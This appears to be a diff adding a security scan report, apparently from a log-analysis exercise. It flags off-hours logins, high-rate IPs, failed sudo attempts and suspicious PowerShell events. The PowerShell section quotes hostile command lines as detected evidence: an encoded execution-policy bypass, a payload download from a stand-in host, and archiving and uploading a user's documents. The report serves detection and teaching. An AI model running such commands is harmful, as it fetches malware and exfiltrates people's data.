@@ -1,0 +1,41 @@
+MALICIOUS ACTIVITY SCAN REPORT
+Generated: 2026-04-14 10:41:18
+==============================
+
+==================================================
+DETECTION: Off-Hours Login Activity
+Business hours: 09:00 - 17:00
+==================================================
+No off-hours logins detected.
+
+==================================================
+DETECTION: High Request Rate / Scanning
+Threshold: >1000 requests per IP
+==================================================
+Found 2 suspicious IP(s):
+
+  IP: 10.216.113.172       Requests: 31341
+  IP: 10.211.47.159        Requests: 17034
+
+==================================================
+DETECTION 3: Sudo Privilege Escalation
+==================================================
+Total failed sudo/auth attempts: 673
+
+Top 3 suspicious IPs:
+  24.151.103.17 -> 149 failed attempts
+  34.204.227.175 -> 43 failed attempts
+  49.4.143.105 -> 40 failed attempts
+
+==================================================
+DETECTION 4: Suspicious PowerShell Patterns
+==================================================
+Total suspicious events: 4
+
+  [!] 2025-02-01 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...
+  [!] 2025-02-01 10:04:02 powershell.exe -Command Invoke-WebRequest http://malicious-site.com/payload.exe
+  [!] 2025-02-01 10:05:33 powershell.exe -Command Compress-Archive C:\Users\student\Documents\data.zip
+  [!] 2025-02-01 10:06:21 powershell.exe -Command Invoke-WebRequest -Upload data.zip
+
+==============================
+END OF REPORT
